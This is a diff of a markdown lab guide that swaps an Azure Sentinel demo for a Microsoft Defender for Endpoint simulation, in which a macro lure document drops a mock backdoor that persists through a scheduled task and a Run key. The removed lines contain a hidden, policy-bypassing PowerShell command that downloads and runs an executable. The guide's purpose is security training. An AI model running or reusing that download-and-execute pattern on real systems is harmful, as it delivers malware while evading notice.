@@ -1,91 +1,125 @@
-# **Demo 12: Azure Sentinel**
+# **Demo 13: Microsoft Defender for Endpoint Attack simulation - Automated investigation (backdoor)**
 
-## What is Azure Sentinel?
+## Introduction to the automated incident response scenario
 
-Microsoft Azure Sentinel is a scalable, cloud-native, security information event management (SIEM) and security orchestration automated response (SOAR) solution. Azure Sentinel delivers intelligent security analytics and threat intelligence across the enterprise, providing a single solution for alert detection, threat visibility, proactive hunting, and threat response.
+In this scenario, we simulate an attack that triggers the new Microsoft Defender for Endpoint automated investigation capabilities. This capability automates the SOC attack response: triage, investigate, and remediate. During the response, automated investigation identifies and removes known attack artifacts from the affected device. It can also automatically pivot to other devices that may be affected and apply the same response actions.
 
-Azure Sentinel is your birds-eye view across the enterprise alleviating the stress of increasingly sophisticated attacks, increasing volumes of alerts, and long resolution time frames.
+To trigger automated investigation, we provide a attack lure document.
 
-- **Collect data at cloud scale** across all users, devices, applications, and infrastructure, both on-premises and in multiple clouds. 
+Document drops backdoor: Scenario simulates attacks that are launched using a socially engineered lure document in a spear-phishing email. The lure is designed to ensure that the receiver doesn’t suspect a thing and unwittingly opens the document.
 
-- **Detect previously undetected threats**, and minimize false positives using Microsoft's analytics and unparalleled threat intelligence. 
+The document, however, is weaponized with crafted macro code that silently drops and loads an executable file onto the device. Although this simulation uses a document that drops a benign executable, the executable behaves as if it is a backdoor attempting to gain persistence—it writes to a registry Run key and creates a scheduled task, both commonly known autostart extensibility points (ASEPs).
 
-- **Investigate threats with artificial intelligence**, and hunt for suspicious activities at scale, tapping into years of cyber security work at Microsoft. 
+The attack simulation ends when the ASEPs are created. In the real world, however, the attacker is expected to use the implanted backdoor to perform other actions within the compromised network, such as moving laterally
 
-- **Respond to incidents rapidly** with built-in orchestration and automation of common tasks.
+## The test device required for this simulation should:
 
-![ws name.](media/sentinel1.png)
+        • Be onboarded to Microsoft Defender for Endpoint
+        • Run Windows 10 Spring Creators Update preview
+        • Have PowerShell turned on
+        • Have Microsoft Defender Antivirus turned on
+        • Have Microsoft Word installed
 
-To on-board Azure Sentinel, you first need to enable Azure Sentinel, and then connect your data sources. Azure Sentinel comes with a number of connectors for Microsoft solutions, available out of the box and providing real-time integration, including Microsoft 365 Defender (formerly Microsoft Threat Protection) solutions, Microsoft 365 sources (including Office 365), Azure AD, Microsoft Defender for Identity (formerly Azure ATP), Microsoft Cloud App Security, Azure Defender alerts from Azure Security Center, and more.
+## **Task 1: Run the simulation**
 
-## Global prerequisites
+Login to any AVD Session host using AVD Client and run Full Desktop Session.
 
-- Active Azure Subscription, if you don't have one, create a [free account](https://azure.microsoft.com/free/?WT.mc_id=A261C142F) before you begin.
+1. Launch AVD Client on your JumpVM.
 
-- Log Analytics workspace. Learn how to [create a Log Analytics workspace](https://docs.microsoft.com/en-us/azure/azure-monitor/logs/quick-create-workspace). For more information about Log Analytics workspaces, see [Designing your Azure Monitor Logs deployment](https://docs.microsoft.com/en-us/azure/azure-monitor/logs/design-logs-deployment).
+>**Note:** The AVD Client must be already logged in during the previous demo login; follow below steps to login using multiple accounts.
 
-- To enable Azure Sentinel, you need contributor permissions to the subscription in which the Azure Sentinel workspace resides.
+2. In AVD desktop client click on **Subscribe with URL**.
 
-- To use Azure Sentinel, you need either contributor or reader permissions on the resource group that the workspace belongs to.
+   ![ws name.](media/img21.png)
 
-- Additional permissions may be needed to connect specific data sources.
+3. - Enter the below feed URL and click **Next**.
+       ```
+       https://rdweb.wvd.microsoft.com/api/arm/feeddiscovery
+       ```   
 
-- Azure Sentinel is a paid service. For pricing information see [About Azure Sentinel](https://go.microsoft.com/fwlink/?linkid=2104058).
+   ![ws name.](media/img23.png)
 
-## **Task 1: Demo and Walkthrough of Azure Sentinel**
+4. - Enter the username as below and click **Next**.
+       ```
+       Eva.4896@AVDDemo.com
+       ```   
+   
+   - Enter the password <inject key="demo Admin Password" /> and click **Sign in**.
 
-1. Sign in to the Azure portal and search for and select Azure Sentinel.
+5. The RemoteApps, along with the Session Desktops published to the logged in user will show up, click on **SessionDesktop**.
 
-![ws name.](media/sentinel2.png)
+   ![ws name.](media/img24.png)
+   
 
-2. Click on **log-analytics-avd-prod-EUS1-001**
+6. Enter the credentials for *Eva.4896@AVDDemo.com* and click on **OK**.
 
-![ws name.](media/sentinel3.png)
+7. Once signed in, the Full Desktop session will be presented.
 
-3. Click on **Data Connectors** and highlight the Connected Data connectors
+   ![ws name.](media/img25.png)
 
-![ws name.](media/sentinel4.png)
+8. Open Edge Browser and download the attack lure document by navigating to the below URL:
 
-4. Click on **Azure Active Directory** and then click on **Open connector page**
+    **- ["RS4_WinATP-Intro-Invoice.docm" attack lure document file can be downloaded from here](https://raw.githubusercontent.com/Eddevinc/AVD-STU-DEMO/7f84c432293d97ee560e93d1dc4648cf6f79048c/media/RS4_WinATP-Intro-Invoice.docm)**
 
-![ws name.](media/sentinel5.png)
+    ![ws name.](media/simulate01.png)
 
-5. On this page you can highlight the **Sign-In** Logs checkbox which indicates that the AAD Sign Logs are now being sent over to Azure Sentinel.
+9. Double-click the downloaded document. Microsoft Word will prompt for a password to open the document.
+    To open the password-protected document, use the password **WDATP!diy#**
 
-![ws name.](media/sentinel6.png)
+    ![ws name.](media/simulate02.png)
 
-6. Click on **Next steps**; On this page you can highlight the **Relevant analytics templates** and showcase the in-built Rules that you can create for various types of events.
+10. Click **Enable Editing** if the document opens in Protected View. If you see a subsequent security
+warning about macros being disabled, click **Enable Content**.
 
-![ws name.](media/sentinel7.png)
+    ![ws name.](media/simulate03.png)
 
-7. Click on **Analytics**; On this page you can highlight the **Active Rules** and showcase the in-built Rules.
+    ![ws name.](media/simulate04.png)
 
-![ws name.](media/sentinel8.png)
+11. Click **OK** on the warning
 
-8. Click on **Incidents**; On this page you can highlight the **Open, New and Active Incidents**. These are Test incidents generated as a result of a simulated malicious command line.
+    ![ws name.](media/simulate05.png)
 
-![ws name.](media/sentinel9.png)
+12. A few seconds later, a new file WinATP-Intro-Backdoor.exe, which represents the backdoor, is dropped onto the Desktop folder by a PowerShell script launched from the document’s malicious macro.
 
-9. Select any of the Incidents; Click on **Actions**, and then click on **Investigate**.
+13. The script goes on to create a scheduled task to launch the backdoor at a predefined time. This mechanism of indirect process launch is sometimes used for stealth, as it is harder to trace back to the document.
 
-![ws name.](media/sentinel10.png)
+14. When the backdoor is launched, it creates an autostart entry under the registry Run key, allowing it to stay persistent by starting automatically with Windows. A Command Prompt window opens, indicating that the simulated backdoor is running.
 
-10. On this page you can highlight the level of details that is shown, like how the process was run, what other child processes were created, who exceuted the process, etc.
+15. The attack simulation ends here. A real attacker, if successful, would likely continue to scan for information, send collected reconnaissance information to a command-and-control (C&C) server, and use this information to move laterally and pursue other attractive targets.
+Next, let’s review and investigate the Defender for Endpoint alerts that surfaced the simulated attack.
 
-![ws name.](media/sentinel11.png)
+>   **Note:** Alerts should start to appear 15-30 minutes after the simulated backdoor is launched.
 
-## **Task 2: Attack Simulation**
+## **Task 2: Review and investigate the Defender for Endpoint alerts that surfaced the simulated attack**
 
-1. Using AVD Client on your JumpVM, Login to any of the Session Desktops with any of the User Accounts.
+We will now be signing into https://security.microsoft.com/alerts using the AVD Presentor Account
 
-2. Open CMD as non-Admin, and execute the below Commandline.
-
+1. In JumpVM launch Edge browser and navigate to Defender Portal using following URL.     
 ```
-powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
+https://security.microsoft.com/alerts
+```				
+2. Sign in into the portal using the below credentials.
+- Username:
 ```
+AVDPresentor01@AVDDemo.com
+```
+- Password: **<inject key="Demo Admin Password" />**
 
-This should take couple of minutes to report to Defender and then eventually being captured by Azure Sentinel. In sometime you should be able to see a new Incident getting created for the above malicious command execution.
+![ws name.](media/demo201.png)
 
-![ws name.](media/sentinel12.png)
+>**Note:** If you are asked for MFA, Scan the below QR Code on your phone's Authenticator App and use the 6 digit code for MFA Authentication.
+>
+![ws name.](media/qr.png)
+>
 
-![ws name.](media/sentinel13.png)
+3. Highlight the **Alerts** and talk about the Auto initaited Investigations:
+
+    ![ws name.](media/simulate06.png)
+
+4. Highlight the **Incidents** and talk about the Auto initaited Investigations and Auto remediations:
+
+    ![ws name.](media/simulate07.png)
+
+5. Highlight the **Action Center** and talk about the Auto initaited Investigations and Auto remediations:
+
+    ![ws name.](media/simulate08.png)
